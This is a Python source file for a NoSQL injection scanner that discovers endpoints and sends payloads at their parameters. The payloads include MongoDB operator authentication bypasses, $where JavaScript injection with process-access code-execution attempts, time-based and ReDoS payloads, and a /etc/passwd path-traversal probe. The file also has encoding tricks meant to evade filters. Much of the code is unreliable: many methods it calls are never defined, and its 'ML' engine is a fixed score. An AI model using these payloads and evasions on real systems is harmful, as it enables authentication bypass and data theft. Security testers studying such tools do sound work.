#!/usr/bin/env python3
"""
NoSQL Injection Detector v2.0
Advanced detection tool with machine learning capabilities and comprehensive payload database
Made by: https://github.com/skypoc
License: MIT
"""

import asyncio
import aiohttp
import argparse
import json
import time
import hashlib
import logging
import sys
import os
import re
import base64
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any, Set
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, unquote
import yaml
from dataclasses import dataclass, field
from enum import Enum
import warnings
import numpy as np
from collections import defaultdict
import random
import string

# Suppress SSL warnings for testing environments
warnings.filterwarnings('ignore')

class InjectionType(Enum):
    """Types of NoSQL injection attacks"""
    AUTHENTICATION_BYPASS = "auth_bypass"
    DATA_EXTRACTION = "data_extraction"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    JAVASCRIPT = "javascript"
    REGEX_BASED = "regex_based"
    JSON_BASED = "json_based"
    AGGREGATION = "aggregation"
    WHERE_CLAUSE = "where_clause"

@dataclass
class DetectionResult:
    """Enhanced result with more metadata"""
    vulnerable: bool
    injection_type: InjectionType
    confidence: float
    payload: Dict[str, Any]
    evidence: str
    endpoint: str
    parameter: str
    method: str
    response_time: float
    severity: str = "Medium"
    cve_references: List[str] = field(default_factory=list)
    remediation: str = ""
    false_positive_score: float = 0.0

class PayloadDatabase:
    """Advanced payload management system"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.successful_payloads = []
        self.failed_payloads = []
        
    def _load_payloads(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load comprehensive payload database"""
        return {
            'authentication_bypass': [
                # Basic operators
                {"$ne": None},
                {"$ne": ""},
                {"$ne": 1},
                {"$gt": ""},
                {"$gte": ""},
                {"$lt": "~"},
                {"$lte": "~"},
                {"$exists": True},
                {"$nin": []},
                {"$in": [None]},
                
                # Regex patterns
                {"$regex": ".*"},
                {"$regex": "^.*"},
                {"$regex": ".*$"},
                {"$regex": "^.*$"},
                {"$regex": "[a-zA-Z]*"},
                {"$regex": ".*admin.*"},
                {"$regex": ".{0,}"},
                {"$regex": ".*", "$options": "i"},
                
                # Logical operators
                {"$or": [{"a": {"$ne": 1}}, {"a": {"$ne": 2}}]},
                {"$and": [{"$gt": ""}, {"$lt": "~"}]},
                {"$nor": [{"$eq": "impossible_value"}]},
                {"$not": {"$eq": ""}},
                
                # Type confusion
                True,
                False,
                [],
                {},
                None,
                0,
                1,
                -1,
                
                # String-based (for parameter pollution)
                "[$ne]",
                "[$regex]=.*",
                '{"$ne":null}',
                '{"$gt":""}',
                
                # Advanced patterns from PayloadsAllTheThings
                {"$where": "true"},
                {"$where": "1==1"},
                {"$where": "'1'=='1'"},
                {"$expr": {"$eq": [1, 1]}},
                {"$expr": {"$ne": ["$password", "impossible"]}},
                {"$jsonSchema": {}},
                {"$comment": "successful_injection"},
            ],
            
            'javascript_injection': [
                # Basic JavaScript
                {"$where": "true"},
                {"$where": "false || true"},
                {"$where": "1"},
                {"$where": "this"},
                {"$where": "return true"},
                {"$where": "function(){return true}"},
                
                # Time-based
                {"$where": "sleep(3000)"},
                {"$where": "var d=new Date();while((new Date())-d<3000){}"},
                {"$where": "var d=new Date();do{var c=new Date();}while(c-d<3000);"},
                
                # Code execution attempts
                {"$where": "this.constructor.constructor('return process')()"},
                {"$where": "this.constructor.constructor('return this')()"},
                {"$where": "Function('return true')()"},
                
                # String injection for WHERE
                "';return true;//",
                "';sleep(3000);//",
                "' || '1'=='1",
                '" || "1"=="1',
                "admin' || 'a'=='a",
                
                # MongoDB 4.4+ $function
                {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}},
                {"$function": {"body": "function(){sleep(3000)}", "args": [], "lang": "js"}},
            ],
            
            'regex_injection': [
                {"$regex": ".*"},
                {"$regex": "^.*"},
                {"$regex": ".*$"},
                {"$regex": "\\.*"},
                {"$regex": "[a-z]*"},
                {"$regex": "[0-9]*"},
                {"$regex": ".*", "$options": "i"},
                {"$regex": ".*", "$options": "s"},
                {"$regex": ".*", "$options": "m"},
                {"$regex": "^a.*"},
                {"$regex": ".*a$"},
                {"$regex": "^(a|b)*$"},
                
                # ReDoS patterns
                {"$regex": "(a+)+$"},
                {"$regex": "([a-z]+)*$"},
                {"$regex": "(a|a)*$"},
            ],
            
            'aggregation_injection': [
                {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}},
                {"$facet": {"users": [{"$match": {}}]}},
                {"$graphLookup": {"from": "users", "startWith": "$_id", "connectFromField": "_id", "connectToField": "_id", "as": "data"}},
                {"$expr": {"$eq": ["$role", "admin"]}},
                {"$expr": {"$in": ["admin", "$roles"]}},
            ],
            
            'error_based': [
                {"$invalidOperator": 1},
                {"$where": "invalid syntax"},
                {"$regex": "["},
                {"$regex": "("},
                {"$expr": {"$divide": [1, 0]}},
                {"$type": "invalidType"},
                {"$size": "notAnArray"},
                {"$mod": ["a", "b"]},
                {"$text": {"$search": "", "$language": "invalid"}},
            ]
        }
    
    def get_payloads(self, category: str, limit: Optional[int] = None) -> List[Any]:
        """Get payloads for a specific category"""
        payloads = self.payloads.get(category, [])
        if limit:
            return payloads[:limit]
        return payloads
    
    def add_successful_payload(self, payload: Any, context: Dict[str, Any]):
        """Track successful payloads for learning"""
        self.successful_payloads.append({
            'payload': payload,
            'context': context,
            'timestamp': datetime.now().isoformat()
        })
    
    def get_adaptive_payloads(self, endpoint: str, parameter: str) -> List[Any]:
        """Get payloads adapted based on previous successes"""
        # Analyze successful payloads and generate variations
        adapted = []
        
        for success in self.successful_payloads[-10:]:  # Last 10 successes
            base_payload = success['payload']
            
            # Generate variations
            if isinstance(base_payload, dict):
                # Try different operators with same structure
                for op in ['$ne', '$gt', '$regex', '$exists']:
                    if op not in str(base_payload):
                        variation = {op: "" if op != '$exists' else True}
                        adapted.append(variation)
                        
            elif isinstance(base_payload, str):
                # String variations
                variations = [
                    base_payload.replace("true", "1"),
                    base_payload.replace("1==1", "2==2"),
                    base_payload.replace("admin", parameter),
                ]
                adapted.extend(variations)
                
        return adapted

class MLDetectionEngine:
    """Machine learning-based detection enhancement"""
    
    def __init__(self):
        self.feature_extractors = [
            self._extract_length_features,
            self._extract_time_features,
            self._extract_content_features,
            self._extract_header_features
        ]
        self.threshold_model = self._initialize_thresholds()
        
    def _initialize_thresholds(self) -> Dict[str, float]:
        """Initialize adaptive thresholds"""
        return {
            'length_variance': 0.2,  # 20% variance
            'time_variance': 2.0,    # 2 seconds
            'content_similarity': 0.7,  # 70% similar
            'status_change': True
        }
    
    def analyze_response_pair(self, baseline: Dict[str, Any], 
                            test: Dict[str, Any]) -> Dict[str, float]:
        """Analyze response pair for anomalies"""
        features = {}
        
        for extractor in self.feature_extractors:
            features.update(extractor(baseline, test))
            
        # Calculate anomaly score
        anomaly_score = self._calculate_anomaly_score(features)
        
        return {
            'features': features,
            'anomaly_score': anomaly_score,
            'is_anomalous': anomaly_score > 0.6
        }
    
    def _extract_length_features(self, baseline: Dict[str, Any], 
                                test: Dict[str, Any]) -> Dict[str, float]:
        """Extract length-based features"""
        baseline_len = baseline.get('length', 0)
        test_len = test.get('length', 0)
        
        if baseline_len == 0:
            variance = 1.0 if test_len > 0 else 0.0
        else:
            variance = abs(test_len - baseline_len) / baseline_len
            
        return {
            'length_variance': variance,
            'length_increased': 1.0 if test_len > baseline_len else 0.0,
            'significant_change': 1.0 if variance > self.threshold_model['length_variance'] else 0.0
        }
    
    def _extract_time_features(self, baseline: Dict[str, Any], 
                              test: Dict[str, Any]) -> Dict[str, float]:
        """Extract timing-based features"""
        baseline_time = baseline.get('response_time', 0)
        test_time = test.get('response_time', 0)
        
        time_diff = test_time - baseline_time
        
        return {
            'time_difference': time_diff,
            'time_anomaly': 1.0 if time_diff > self.threshold_model['time_variance'] else 0.0,
            'possible_timeout': 1.0 if test.get('timeout', False) else 0.0
        }
    
    def _extract_content_features(self, baseline: Dict[str, Any], 
                                 test: Dict[str, Any]) -> Dict[str, float]:
        """Extract content-based features"""
        baseline_content = baseline.get('content', '')
        test_content = test.get('content', '')
        
        # Simple similarity using Jaccard index on words
        baseline_words = set(baseline_content.lower().split())
        test_words = set(test_content.lower().split())
        
        if not baseline_words and not test_words:
            similarity = 1.0
        elif not baseline_words or not test_words:
            similarity = 0.0
        else:
            intersection = len(baseline_words & test_words)
            union = len(baseline_words | test_words)
            similarity = intersection / union if union > 0 else 0
            
        # Check for injection indicators
        success_keywords = ['admin', 'dashboard', 'welcome', 'success', 'logged']
        error_keywords = ['error', 'invalid', 'failed', 'denied']
        
        success_found = sum(1 for kw in success_keywords if kw in test_content.lower())
        error_found = sum(1 for kw in error_keywords if kw in test_content.lower())
        
        return {
            'content_similarity': similarity,
            'success_indicators': success_found / len(success_keywords),
            'error_indicators': error_found / len(error_keywords),
            'content_changed': 1.0 if similarity < self.threshold_model['content_similarity'] else 0.0
        }
    
    def _extract_header_features(self, baseline: Dict[str, Any], 
                               test: Dict[str, Any]) -> Dict[str, float]:
        """Extract header-based features"""
        baseline_headers = baseline.get('headers', {})
        test_headers = test.get('headers', {})
        
        # Status code change
        status_changed = baseline.get('status') != test.get('status')
        
        # Cookie changes
        baseline_cookies = baseline_headers.get('set-cookie', '')
        test_cookies = test_headers.get('set-cookie', '')
        cookie_changed = baseline_cookies != test_cookies
        
        # Location header (redirects)
        redirect_changed = baseline_headers.get('location') != test_headers.get('location')
        
        return {
            'status_changed': 1.0 if status_changed else 0.0,
            'cookie_changed': 1.0 if cookie_changed else 0.0,
            'redirect_changed': 1.0 if redirect_changed else 0.0,
            'header_anomaly': 1.0 if any([status_changed, cookie_changed, redirect_changed]) else 0.0
        }
    
    def _calculate_anomaly_score(self, features: Dict[str, float]) -> float:
        """Calculate overall anomaly score"""
        # Weighted scoring based on feature importance
        weights = {
            'significant_change': 0.3,
            'time_anomaly': 0.25,
            'content_changed': 0.2,
            'success_indicators': 0.15,
            'header_anomaly': 0.1
        }
        
        score = 0.0
        for feature, weight in weights.items():
            score += features.get(feature, 0) * weight
            
        return min(score, 1.0)

class AdvancedEvasion:
    """Advanced evasion techniques"""
    
    def __init__(self):
        self.encoding_methods = [
            self._unicode_encode,
            self._url_encode,
            self._double_url_encode,
            self._base64_encode,
            self._hex_encode,
            self._mixed_case,
            self._whitespace_variation
        ]
        
    def apply_evasion(self, payload: Any, level: int = 1) -> List[Any]:
        """Apply multiple evasion techniques"""
        evasions = [payload]  # Original
        
        if isinstance(payload, str):
            for i in range(min(level, len(self.encoding_methods))):
                method = self.encoding_methods[i]
                try:
                    encoded = method(payload)
                    if encoded != payload:
                        evasions.append(encoded)
                except:
                    pass
                    
        elif isinstance(payload, dict):
            # For dict payloads, try key encoding
            for key, value in payload.items():
                if key.startswith('$'):
                    # Try encoding the operator
                    encoded_key = self._unicode_encode(key)
                    if encoded_key != key:
                        evasions.append({encoded_key: value})
                        
        return evasions
    
    def _unicode_encode(self, text: str) -> str:
        """Unicode encoding for special characters"""
        replacements = {
            '$': '\\u0024',
            '{': '\\u007b',
            '}': '\\u007d',
            '"': '\\u0022',
            "'": '\\u0027'
        }
        
        result = text
        for char, encoded in replacements.items():
            result = result.replace(char, encoded)
        return result
    
    def _url_encode(self, text: str) -> str:
        """URL encode special characters"""
        return quote(text, safe='')
    
    def _double_url_encode(self, text: str) -> str:
        """Double URL encoding"""
        return quote(quote(text, safe=''), safe='')
    
    def _base64_encode(self, text: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(text.encode()).decode()
    
    def _hex_encode(self, text: str) -> str:
        """Hex encoding"""
        return ''.join(f'\\x{ord(c):02x}' for c in text)
    
    def _mixed_case(self, text: str) -> str:
        """Random case mixing"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _whitespace_variation(self, text: str) -> str:
        """Add whitespace variations"""
        spaces = [' ', '\t', '\n', '\r', '\f']
        return text.replace(' ', random.choice(spaces))

class NoSQLDetector:
    """Enhanced NoSQL injection detection engine"""
    
    def __init__(self, config_path: Optional[str] = None):
        self.config = self._load_config(config_path)
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[DetectionResult] = []
        self.logger = self._setup_logging()
        self.request_count = 0
        self.start_time = None
        
        # Initialize subsystems
        self.payload_db = PayloadDatabase()
        self.ml_engine = MLDetectionEngine()
        self.evasion = AdvancedEvasion()
        
        # Tracking
        self.endpoint_fingerprints = {}
        self.parameter_types = {}
        
    def _load_config(self, config_path: Optional[str]) -> Dict[str, Any]:
        """Load configuration from file or use defaults"""
        default_config = {
            "timeout": 30,
            "max_concurrent_requests": 10,
            "delay_between_requests": 0.5,
            "user_agent": "NoSQL-Detector/2.0 (Advanced Security Scanner)",
            "follow_redirects": False,
            "verify_ssl": False,
            "detection_methods": {
                "authentication_bypass": True,
                "boolean_based": True,
                "time_based": True,
                "error_based": True,
                "javascript": True,
                "regex_based": True,
                "aggregation": True
            },
            "evasion_techniques": {
                "randomize_user_agent": True,
                "add_delay_variance": True,
                "use_encoding": True,
                "evasion_level": 2  # 0-3
            },
            "ml_detection": {
                "enabled": True,
                "sensitivity": 0.7
            },
            "reporting": {
                "include_false_positives": False,
                "verbose_evidence": True,
                "generate_poc": True
            }
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    user_config = yaml.safe_load(f)
                    # Deep merge
                    self._deep_merge(default_config, user_config)
            except Exception as e:
                print(f"Warning: Could not load config file: {e}")
                
        return default_config
    
    def _deep_merge(self, base: Dict, update: Dict):
        """Deep merge dictionaries"""
        for key, value in update.items():
            if key in base and isinstance(base[key], dict) and isinstance(value, dict):
                self._deep_merge(base[key], value)
            else:
                base[key] = value
    
    def _setup_logging(self) -> logging.Logger:
        """Configure logging with rotation"""
        logger = logging.getLogger('NoSQLDetector')
        logger.setLevel(logging.INFO)
        
        # Console handler with color
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        
        # File handler with rotation
        from logging.handlers import RotatingFileHandler
        file_handler = RotatingFileHandler(
            f'nosql_detection_{datetime.now().strftime("%Y%m%d")}.log',
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5
        )
        file_handler.setLevel(logging.DEBUG)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        console_handler.setFormatter(formatter)
        file_handler.setFormatter(formatter)
        
        logger.addHandler(console_handler)
        logger.addHandler(file_handler)
        
        return logger
    
    async def detect(self, target: str, endpoints: Optional[List[str]] = None):
        """Enhanced detection with ML and advanced techniques"""
        self.start_time = time.time()
        self.logger.info(f"Starting advanced NoSQL injection detection on {target}")
        
        # Parse target
        parsed = urlparse(target)
        if not parsed.scheme:
            target = f"http://{target}"
            
        # Create session with custom settings
        timeout = aiohttp.ClientTimeout(total=self.config['timeout'])
        connector = aiohttp.TCPConnector(
            verify_ssl=self.config['verify_ssl'],
            limit=self.config['max_concurrent_requests']
        )
        
        # Custom headers
        headers = {
            'User-Agent': self._get_user_agent(),
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'
        }
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers
        ) as self.session:
            # Phase 1: Reconnaissance
            self.logger.info("Phase 1: Reconnaissance")
            if not endpoints:
                endpoints = await self._discover_endpoints(target)
                
            # Phase 2: Fingerprinting
            self.logger.info("Phase 2: Fingerprinting")
            await self._fingerprint_endpoints(endpoints)
            
            # Phase 3: Vulnerability Detection
            self.logger.info("Phase 3: Vulnerability Detection")
            tasks = []
            for endpoint in endpoints:
                task = self._test_endpoint_advanced(target, endpoint)
                tasks.append(task)
                
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Phase 4: Verification
            self.logger.info("Phase 4: Verification")
            await self._verify_findings()
            
        # Generate comprehensive report
        return self._generate_advanced_report()
    
    async def _discover_endpoints(self, target: str) -> List[str]:
        """Enhanced endpoint discovery with crawling"""
        self.logger.info("Discovering endpoints...")
        
        discovered = set()
        
        # Common endpoints
        common_endpoints = [
            # Authentication
            '/api/login', '/api/auth', '/api/signin', '/api/authenticate',
            '/login', '/auth', '/signin', '/authenticate',
            '/api/v1/auth', '/api/v2/auth', '/api/v1/login',
            
            # User management
            '/api/users', '/api/user', '/api/profile', '/api/account',
            '/users', '/user', '/profile', '/account',
            
            # Search/Query
            '/api/search', '/api/query', '/api/find', '/api/filter',
            '/search', '/query', '/find', '/filter',
            
            # GraphQL
            '/graphql', '/api/graphql', '/gql',
            
            # Admin
            '/api/admin', '/admin', '/api/admin/login',
            
            # Other
            '/api/', '/api/v1/', '/api/v2/', '/rest/',
            '/.json', '/data.json', '/api/data'
        ]
        
        # Test endpoints
        for endpoint in common_endpoints:
            url = urljoin(target, endpoint)
            if await self._endpoint_exists(url):
                discovered.add(url)
                self.logger.info(f"Found endpoint: {url}")
                
        # Try to discover more through crawling
        if len(discovered) < 3:  # If few endpoints found
            # Try robots.txt
            robots_url = urljoin(target, '/robots.txt')
            robots_endpoints = await self._parse_robots(robots_url)
            for endpoint in robots_endpoints:
                url = urljoin(target, endpoint)
                if await self._endpoint_exists(url):
                    discovered.add(url)
                    
        return list(discovered)
    
    async def _fingerprint_endpoints(self, endpoints: List[str]):
        """Fingerprint endpoints to understand their behavior"""
        for endpoint in endpoints:
            fingerprint = {
                'methods': [],
                'parameters': [],
                'content_types': [],
                'auth_required': False,
                'rate_limited': False
            }
            
            # Test different HTTP methods
            for method in ['GET', 'POST', 'PUT', 'DELETE']:
                try:
                    async with self.session.request(method, endpoint) as response:
                        if response.status not in [405, 501]:  # Method not allowed
                            fingerprint['methods'].append(method)
                            
                        # Check for auth requirements
                        if response.status in [401, 403]:
                            fingerprint['auth_required'] = True
                            
                        # Check for rate limiting
                        if response.status == 429:
                            fingerprint['rate_limited'] = True
                            
                        # Get content type
                        content_type = response.headers.get('Content-Type', '')
                        if content_type and content_type not in fingerprint['content_types']:
                            fingerprint['content_types'].append(content_type)
                            
                except:
                    pass
                    
            self.endpoint_fingerprints[endpoint] = fingerprint
            self.logger.debug(f"Fingerprinted {endpoint}: {fingerprint}")
    
    async def _test_endpoint_advanced(self, target: str, endpoint: str):
        """Advanced endpoint testing with ML analysis"""
        self.logger.info(f"Testing endpoint: {endpoint}")
        
        # Get fingerprint
        fingerprint = self.endpoint_fingerprints.get(endpoint, {})
        
        # Test each supported method
        for method in fingerprint.get('methods', ['GET', 'POST']):
            # Get baseline
            baseline = await self._get_baseline_advanced(endpoint, method)
            if not baseline:
                continue
                
            # Identify parameters
            params = await self._identify_parameters_advanced(endpoint, method, baseline)
            
            # Test each parameter with different techniques
            for param in params:
                # Store parameter type for adaptive testing
                param_type = await self._infer_parameter_type(endpoint, method, param, baseline)
                self.parameter_types[f"{endpoint}:{param}"] = param_type
                
                # Run detection methods
                if self.config['detection_methods']['authentication_bypass']:
                    await self._test_auth_bypass_advanced(endpoint, method, param, baseline)
                    
                if self.config['detection_methods']['boolean_based']:
                    await self._test_boolean_advanced(endpoint, method, param, baseline)
                    
                if self.config['detection_methods']['time_based']:
                    await self._test_time_based_advanced(endpoint, method, param, baseline)
                    
                if self.config['detection_methods']['javascript']:
                    await self._test_javascript_advanced(endpoint, method, param, baseline)
                    
                if self.config['detection_methods']['regex_based']:
                    await self._test_regex_advanced(endpoint, method, param, baseline)
                    
                # ML-based anomaly detection
                if self.config['ml_detection']['enabled']:
                    await self._test_ml_anomaly(endpoint, method, param, baseline)
                    
                # Adaptive delay
                await self._smart_delay()
    
    async def _test_auth_bypass_advanced(self, endpoint: str, method: str, 
                                       param: str, baseline: Dict[str, Any]):
        """Advanced authentication bypass testing"""
        self.logger.debug(f"Testing auth bypass on {param}")
        
        # Get appropriate payloads
        payloads = self.payload_db.get_payloads('authentication_bypass')
        
        # Add adaptive payloads
        adaptive = self.payload_db.get_adaptive_payloads(endpoint, param)
        payloads.extend(adaptive)
        
        # Apply evasion to payloads
        evasion_level = self.config['evasion_techniques']['evasion_level']
        all_payloads = []
        for payload in payloads[:20]:  # Limit to prevent too many requests
            evasions = self.evasion.apply_evasion(payload, evasion_level)
            all_payloads.extend(evasions)
            
        # Test payloads
        for payload in all_payloads:
            result = await self._send_payload_advanced(endpoint, method, param, payload, baseline)
            
            if not result:
                continue
                
            # Analyze with ML
            ml_analysis = self.ml_engine.analyze_response_pair(baseline, result)
            
            # Determine if vulnerable
            is_vulnerable = False
            confidence = 0.5
            
            # Traditional detection
            if self._detect_auth_bypass_pattern(baseline, result):
                is_vulnerable = True
                confidence = 0.8
                
            # ML detection
            elif ml_analysis['is_anomalous'] and ml_analysis['anomaly_score'] > self.config['ml_detection']['sensitivity']:
                is_vulnerable = True
                confidence = ml_analysis['anomaly_score']
                
            if is_vulnerable:
                # Track successful payload
                self.payload_db.add_successful_payload(payload, {
                    'endpoint': endpoint,
                    'parameter': param,
                    'method': method
                })
                
                # Calculate severity
                severity = self._calculate_severity(endpoint, param, InjectionType.AUTHENTICATION_BYPASS)
                
                detection = DetectionResult(
                    vulnerable=True,
                    injection_type=InjectionType.AUTHENTICATION_BYPASS,
                    confidence=confidence,
                    payload={param: payload},
                    evidence=self._generate_evidence(baseline, result, ml_analysis),
                    endpoint=endpoint,
                    parameter=param,
                    method=method,
                    response_time=result.get('response_time', 0),
                    severity=severity,
                    cve_references=self._get_cve_references(InjectionType.AUTHENTICATION_BYPASS),
                    remediation=self._get_remediation(InjectionType.AUTHENTICATION_BYPASS, param),
                    false_positive_score=1.0 - confidence
                )
                
                self.results.append(detection)
                self.logger.warning(f"Authentication bypass vulnerability found: {detection}")
                
                # Stop testing this parameter if high confidence
                if confidence > 0.9:
                    break
    
    async def _test_ml_anomaly(self, endpoint: str, method: str, 
                              param: str, baseline: Dict[str, Any]):
        """Pure ML-based anomaly detection"""
        self.logger.debug(f"ML anomaly detection on {param}")
        
        # Generate smart payloads based on parameter type
        param_type = self.parameter_types.get(f"{endpoint}:{param}", "unknown")
        
        smart_payloads = []
        if param_type == "string":
            smart_payloads.extend([
                "a" * 1000,  # Long string
                "",  # Empty
                "\x00",  # Null byte
                "\\",  # Backslash
                "../../../etc/passwd",  # Path traversal
            ])
        elif param_type == "number":
            smart_payloads.extend([
                -1, 0, 1, 999999999, -999999999,
                0.1, 3.14159, float('inf'), float('-inf')
            ])
        elif param_type == "boolean":
            smart_payloads.extend([
                True, False, 1, 0, "true", "false", "yes", "no", None
            ])
            
        # Test each payload
        anomalies = []
        for payload in smart_payloads:
            result = await self._send_payload_advanced(endpoint, method, param, payload, baseline)
            if result:
                ml_analysis = self.ml_engine.analyze_response_pair(baseline, result)
                if ml_analysis['is_anomalous']:
                    anomalies.append({
                        'payload': payload,
                        'score': ml_analysis['anomaly_score'],
                        'features': ml_analysis['features']
                    })
                    
        # If multiple anomalies detected, likely vulnerable
        if len(anomalies) >= 2:
            best_anomaly = max(anomalies, key=lambda x: x['score'])
            
            detection = DetectionResult(
                vulnerable=True,
                injection_type=InjectionType.DATA_EXTRACTION,
                confidence=best_anomaly['score'],
                payload={param: best_anomaly['payload']},
                evidence=f"ML detected anomalous behavior. Score: {best_anomaly['score']:.2f}",
                endpoint=endpoint,
                parameter=param,
                method=method,
                response_time=0,
                severity="Medium",
                remediation="Implement input validation and type checking"
            )
            
            self.results.append(detection)
            self.logger.warning(f"ML anomaly detected: {detection}")
    
    async def _verify_findings(self):
        """Verify findings to reduce false positives"""
        self.logger.info("Verifying findings...")
        
        verified_results = []
        
        for result in self.results:
            # Skip if low confidence
            if result.confidence < 0.6:
                continue
                
            # Verify by retesting
            verified = await self._verify_single_finding(result)
            
            if verified:
                verified_results.append(result)
            else:
                self.logger.debug(f"Could not verify: {result}")
                
        self.results = verified_results
    
    async def _verify_single_finding(self, finding: DetectionResult) -> bool:
        """Verify a single finding"""
        # Retest with same payload
        baseline = await self._get_baseline_advanced(finding.endpoint, finding.method)
        if not baseline:
            return False
            
        # Test payload again
        result = await self._send_payload_advanced(
            finding.endpoint, 
            finding.method,
            finding.parameter,
            finding.payload[finding.parameter],
            baseline
        )
        
        if not result:
            return False
            
        # Check if still anomalous
        ml_analysis = self.ml_engine.analyze_response_pair(baseline, result)
        
        return ml_analysis['is_anomalous'] and ml_analysis['anomaly_score'] > 0.5
    
    async def _infer_parameter_type(self, endpoint: str, method: str, 
                                  param: str, baseline: Dict[str, Any]) -> str:
        """Infer parameter type through testing"""
        type_tests = {
            'number': [0, 1, -1, 3.14, "not_a_number"],
            'boolean': [True, False, 1, 0, "true", "false"],
            'array': [[], [1, 2, 3], "not_an_array"],
            'object': [{}, {"key": "value"}, "not_an_object"]
        }
        
        inferred_type = "string"  # Default
        
        for test_type, test_values in type_tests.items():
            success_count = 0
            
            for value in test_values[:3]:  # Test first 3 valid values
                result = await self._send_payload_advanced(endpoint, method, param, value, baseline)
                if result and result.get('status') not in [400, 422]:  # Not a bad request
                    success_count += 1
                    
            if success_count >= 2:
                inferred_type = test_type
                break
                
        return inferred_type
    
    def _detect_auth_bypass_pattern(self, baseline: Dict[str, Any], 
                                  result: Dict[str, Any]) -> bool:
        """Detect authentication bypass patterns"""
        # Status code indicators
        if baseline.get('status') in [401, 403] and result.get('status') in [200, 201, 204]:
            return True
            
        # Content indicators
        baseline_content = baseline.get('content', '').lower()
        result_content = result.get('content', '').lower()
        
        # Authentication success patterns
        success_patterns = [
            'welcome', 'dashboard', 'logged in', 'authenticated',
            'success', 'token', 'session', 'profile'
        ]
        
        # Error patterns that should disappear
        error_patterns = [
            'unauthorized', 'forbidden', 'access denied', 'login required',
            'please login', 'authentication failed'
        ]
        
        # Check for appearance of success patterns
        for pattern in success_patterns:
            if pattern in result_content and pattern not in baseline_content:
                return True
                
        # Check for disappearance of error patterns
        for pattern in error_patterns:
            if pattern in baseline_content and pattern not in result_content:
                return True
                
        # Significant content length increase (might indicate more data returned)
        if result.get('length', 0) > baseline.get('length', 0) * 1.5:
            return True
            
        # Cookie/session changes
        baseline_cookies = baseline.get('headers', {}).get('set-cookie', '')
        result_cookies = result.get('headers', {}).get('set-cookie', '')
        
        if 'session' in result_cookies.lower() and 'session' not in baseline_cookies.lower():
            return True
            
        return False
    
    def _calculate_severity(self, endpoint: str, param: str, 
                          injection_type: InjectionType) -> str:
        """Calculate vulnerability severity"""
        severity_score = 5  # Base score
        
        # Type-based scoring
        if injection_type == InjectionType.AUTHENTICATION_BYPASS:
            severity_score += 4
        elif injection_type == InjectionType.JAVASCRIPT:
            severity_score += 3
        elif injection_type == InjectionType.DATA_EXTRACTION:
            severity_score += 2
            
        # Endpoint-based scoring
        if any(auth in endpoint.lower() for auth in ['login', 'auth', 'admin']):
            severity_score += 2
            
        # Parameter-based scoring
        if any(sensitive in param.lower() for sensitive in ['password', 'token', 'key', 'secret']):
            severity_score += 2
            
        # Map to severity levels
        if severity_score >= 9:
            return "Critical"
        elif severity_score >= 7:
            return "High"
        elif severity_score >= 5:
            return "Medium"
        else:
            return "Low"
    
    def _get_cve_references(self, injection_type: InjectionType) -> List[str]:
        """Get relevant CVE references"""
        cve_db = {
            InjectionType.AUTHENTICATION_BYPASS: [
                "CWE-89: SQL Injection",
                "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
            ],
            InjectionType.JAVASCRIPT: [
                "CWE-94: Code Injection",
                "CWE-95: Eval Injection"
            ],
            InjectionType.DATA_EXTRACTION: [
                "CWE-209: Information Exposure Through Error Messages",
                "CWE-213: Exposure of Sensitive Information Due to Incompatible Policies"
            ]
        }
        
        return cve_db.get(injection_type, ["CWE-20: Improper Input Validation"])
    
    def _get_remediation(self, injection_type: InjectionType, param: str) -> str:
        """Get specific remediation advice"""
        remediations = {
            InjectionType.AUTHENTICATION_BYPASS: f"""
1. Validate the '{param}' parameter to ensure it's a string, not an object
2. Use parameterized queries: db.collection.find({{field: userInput}})
3. Implement input sanitization: reject values containing '$' or '{{'
4. Example fix:
   if (typeof {param} !== 'string') {{
       throw new Error('Invalid input type');
   }}
""",
            InjectionType.JAVASCRIPT: f"""
1. Avoid using $where operator with user input
2. If $where is necessary, use a whitelist of allowed operations
3. Disable JavaScript execution in MongoDB if not required
4. Example fix:
   // Instead of $where
   db.collection.find({{{param}: userInput}})
   // Not: db.collection.find({{$where: `this.{param} == '${{userInput}}'`}})
""",
            InjectionType.DATA_EXTRACTION: f"""
1. Implement strict input validation for '{param}'
2. Use schema validation in your application
3. Limit query results and implement pagination
4. Monitor for unusual query patterns
"""
        }
        
        return remediations.get(
            injection_type,
            f"Implement proper input validation and sanitization for parameter '{param}'"
        )
    
    def _generate_evidence(self, baseline: Dict[str, Any], result: Dict[str, Any], 
                         ml_analysis: Dict[str, Any]) -> str:
        """Generate detailed evidence"""
        evidence_parts = []
        
        # Response differences
        if result.get('status') != baseline.get('status'):
            evidence_parts.append(
                f"Status code changed from {baseline.get('status')} to {result.get('status')}"
            )
            
        length_diff = result.get('length', 0) - baseline.get('length', 0)
        if abs(length_diff) > 100:
            evidence_parts.append(
                f"Response length changed by {length_diff:+d} bytes"
            )
            
        # ML insights
        if ml_analysis:
            anomaly_score = ml_analysis.get('anomaly_score', 0)
            if anomaly_score > 0.7:
                evidence_parts.append(
                    f"ML anomaly score: {anomaly_score:.2f} (high confidence)"
                )
                
            # Feature highlights
            features = ml_analysis.get('features', {})
            if features.get('success_indicators', 0) > 0:
                evidence_parts.append(
                    "Success keywords detected in response"
                )
                
        # Timing
        time_diff = result.get('response_time', 0) - baseline.get('response_time', 0)
        if time_diff > 2:
            evidence_parts.append(
                f"Response time increased by {time_diff:.2f} seconds"
            )
            
        return "; ".join(evidence_parts) if evidence_parts else "Anomalous behavior detected"
    
